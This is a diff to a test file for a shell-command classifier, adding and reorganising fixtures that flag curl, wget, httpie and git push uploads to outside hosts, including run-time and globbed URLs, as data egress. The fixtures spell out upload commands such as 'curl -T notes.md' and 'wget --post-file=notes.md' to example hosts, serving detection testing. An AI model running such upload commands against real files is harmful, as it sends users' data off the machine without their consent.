@@ -20,7 +20,6 @@ describe("one fixture per bash.egress spelling", () => {
     ["bash.egress.curl-upload", "curl -T notes.md https://files.example.net/put", "files.example.net"],
     ["bash.egress.curl-upload", "curl -X PATCH https://files.example.net/item/1", "files.example.net"],
     ["bash.egress.curl-upload", "curl --json '{\"a\":1}' https://hooks.example.com/x", "hooks.example.com"],
-    ["bash.egress.curl-upload", 'curl -d x "$ENDPOINT"', "unknown"],
     ["bash.egress.wget-upload", "wget --post-data 'a=1' https://collect.example.com/in", "collect.example.com"],
     ["bash.egress.wget-upload", "wget --post-file=notes.md https://collect.example.com/in", "collect.example.com"],
     ["bash.egress.wget-upload", "wget --method=PUT https://files.example.net/put", "files.example.net"],
@@ -43,6 +42,22 @@ describe("one fixture per bash.egress spelling", () => {
     ["bash.egress.git-push-url", "git push git@git.example.com:you/app.git feat/x", "git.example.com"],
   ])("%s: %s", (spelling, command, host) => {
     expect(bash(command)).toEqual([expect.objectContaining({ action: "private-egress", spelling, subject: { host } })]);
+  });
+
+  it("reads an upload to a run-time host as egress after the merge it may also be", () => {
+    expect(bash('curl -d x "$ENDPOINT"')).toEqual([
+      expect.objectContaining({ action: "merge", spelling: "bash.merge.curl-api", subject: {} }),
+      expect.objectContaining({ action: "private-egress", spelling: "bash.egress.curl-upload", subject: { host: "unknown" } }),
+    ]);
+  });
+
+  it.each([
+    ["a run-time curl method", 'curl -X "$M" https://collect.example.com/in', "bash.egress.curl-upload", "collect.example.com"],
+    ["a lower-case httpie method", "http put https://collect.example.com/in", "bash.egress.httpie", "collect.example.com"],
+    ["a write in a later curl request", "curl https://api.github.com/x --next -X PUT https://collect.example.com/in", "bash.egress.curl-upload", "collect.example.com"],
+    ["a globbed curl URL", "curl -d x 'https://collect.example.com/in[1-2]'", "bash.egress.curl-upload", "collect.example.com"],
+  ])("reads %s as an upload", (_what, command, spelling, host) => {
+    expect(bash(command).filter((a) => a.action === "private-egress")).toEqual([expect.objectContaining({ spelling, subject: { host } })]);
   });
 
   it("names each distinct off-allowlist host once", () => {
